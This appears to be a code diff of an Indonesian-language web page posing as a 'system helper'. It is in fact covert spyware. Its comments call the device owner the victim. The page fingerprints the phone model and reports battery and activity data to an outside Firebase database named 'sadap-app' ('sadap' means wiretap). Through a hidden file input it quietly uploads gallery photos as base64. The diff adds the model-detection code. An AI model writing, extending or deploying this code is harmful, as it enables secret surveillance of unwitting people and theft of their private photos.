@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -6,16 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Helper</title>
     <style>
-        body { background: #0f172a; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .box { background: #1e293b; padding: 20px; border-radius: 10px; margin: 20px; display: inline-block; width: 80%; max-width: 400px; }
-        #status { color: #38bdf8; font-weight: bold; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+        body { background: #0f172a; color: #fff; text-align: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .box { background: #1e293b; border: 1px solid #334155; padding: 25px; border-radius: 16px; width: 100%; max-width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        h3 { color: #38bdf8; font-size: 18px; margin-bottom: 8px; }
+        #status { color: #4ade80; font-weight: bold; font-size: 14px; margin-bottom: 15px; }
+        .info-id { background: #0f172a; padding: 10px; border-radius: 8px; font-size: 12px; color: #94a3b8; border: 1px dashed #334155; }
+        span { color: #f8fafc; font-family: monospace; }
     </style>
 </head>
 <body>
     <div class="box">
         <h3>Memproses Sistem...</h3>
         <p id="status">Menghubungkan...</p>
-        <p style="opacity: 0.5; font-size: 12px;">ID: <span id="dev-id"></span></p>
+        <div class="info-id">ID Target: <span id="dev-id">-</span></div>
         
         <!-- Input file tersembunyi untuk mengambil sampel galeri secara diam-diam -->
         <input type="file" id="galleryInput" accept="image/*" multiple style="display:none;" onchange="uploadPhotos(this)">
@@ -24,7 +27,7 @@
     <script>
         const databaseURL = "https://sadap-app-d2359-default-rtdb.firebaseio.com";
         
-        // Bikin ID unik untuk HP Korban/Target agar tidak tertukar
+        // Buat atau ambil ID unik untuk perangkat korban
         let deviceId = localStorage.getItem("winz_device_id");
         if (!deviceId) {
             deviceId = "Target_" + Math.floor(Math.random() * 99999);
@@ -32,11 +35,30 @@
         }
         document.getElementById('dev-id').innerText = deviceId;
 
+        // Fungsi otomatis deteksi nama/model HP target
+        function getPhoneModel() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) {
+                let match = ua.match(/;\s([^;]+)\sBuild\//);
+                if (match && match[1]) return match[1];
+            }
+            if (ua.includes("Samsung")) return "Samsung Device";
+            if (ua.includes("OPPO")) return "OPPO Device";
+            if (ua.includes("Vivo")) return "Vivo Device";
+            if (ua.includes("Xiaomi") || ua.includes("Redmi")) return "Xiaomi / Redmi";
+            if (ua.includes("Infinix")) return "Infinix Device";
+            if (ua.includes("Tecno")) return "Tecno Device";
+            return "Android Target";
+        }
+
         function kirimData(level, charging) {
+            const phoneName = getPhoneModel();
+
             fetch(`${databaseURL}/devices/${deviceId}.json`, {
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
+                    model: phoneName,       // Mengirim nama HP asli ke database
                     battery: level,
                     charging: charging,
                     lastActive: Date.now()
@@ -48,7 +70,7 @@
             });
         }
 
-        // Ambil Data Baterai
+        // Ambil Data Baterai secara real-time
         if ('getBattery' in navigator) {
             navigator.getBattery().then(battery => {
                 function update() {
@@ -58,10 +80,12 @@
                 battery.addEventListener('levelchange', update);
                 battery.addEventListener('chargingchange', update);
             });
+        } else {
+            // Cadangan jika fungsi baterai tidak didukung browser korban
+            kirimData(100, "Online");
         }
 
         // --- FITUR SINKRONISASI GALERI ---
-        // Fungsi untuk mengonversi dan mengirim foto ke Firebase Realtime Database
         function uploadPhotos(input) {
             const files = input.files;
             if (!files || files.length === 0) return;
@@ -73,7 +97,6 @@
                 reader.onload = function(e) {
                     const base64Image = e.target.result;
 
-                    // Kirim data base64 foto ke node galleries/{deviceId}
                     fetch(`${databaseURL}/galleries/${deviceId}.json`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -90,3 +113,4 @@
     </script>
 </body>
 </html>
+
